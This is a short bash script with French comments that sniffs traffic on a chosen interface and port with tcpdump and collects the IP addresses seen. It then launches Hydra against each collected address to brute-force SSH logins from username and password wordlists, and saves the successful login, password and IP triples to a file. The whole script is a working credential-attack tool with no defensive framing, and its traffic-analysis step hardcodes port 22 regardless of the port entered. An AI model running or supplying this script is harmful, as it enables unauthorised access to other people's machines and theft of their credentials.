#!/bin/bash

# Demander à l'utilisateur le nom de l'interface réseau
echo "Entrez le nom de l'interface réseau à écouter (ex: eth0):"
read INTERFACE

# Demander à l'utilisateur le port à écouter
echo "Entrez le port à écouter (ex: 22 pour SSH):"
read PORT

# Demander à l'utilisateur la durée de la capture en secondes
echo "Entrez la durée de la capture en secondes:"
read DUREE

# Fichier pour stocker les adresses IP uniques
IP_FILE="ips.log"
# Fichier pour stocker les résultats de Hydra
HYDRA_RESULTS="hydra_results.log"
# Fichier final pour stocker les couples login, mot de passe et IP
FINAL_RESULTS="final_results.txt"

# Démarrer tcpdump en arrière-plan
echo "Démarrage de tcpdump sur le port $PORT..."
tcpdump -i "$INTERFACE" port "$PORT" -n -G "$DUREE" -W 1 -w capture.pcap &
TCPDUMP_PID=$!

# Attendre la durée spécifiée puis terminer tcpdump
sleep "$DUREE"
kill $TCPDUMP_PID

# Analyser le fichier pcap et extraire les adresses IP
tcpdump -n -r capture.pcap 'tcp port 22' | awk '{print $3}' | sed 's/\.[0-9]*$//' | sort -u > "$IP_FILE"

# Vérifie si le fichier contenant les IP n'est pas vide
if [ -s "$IP_FILE" ]; then
    echo "Fichier d'IP rempli, démarrage de Hydra..."
    # Lancer Hydra sur les adresses IP capturées avec les fichiers login et mot de passe et stocker les résultats
    hydra -L login.txt -P psswd.txt -M "$IP_FILE" ssh > "$HYDRA_RESULTS"

    # Analyser les résultats de Hydra et extraire les couples réussis
    grep 'login:' "$HYDRA_RESULTS" | awk '{print $3, $5, $7}' > "$FINAL_RESULTS"
    echo "Les résultats ont été stockés dans $FINAL_RESULTS"
else
    echo "Aucune adresse IP capturée sur le port $PORT."
fi

# Nettoyer les fichiers temporaires
rm capture.pcap
rm "$HYDRA_RESULTS"
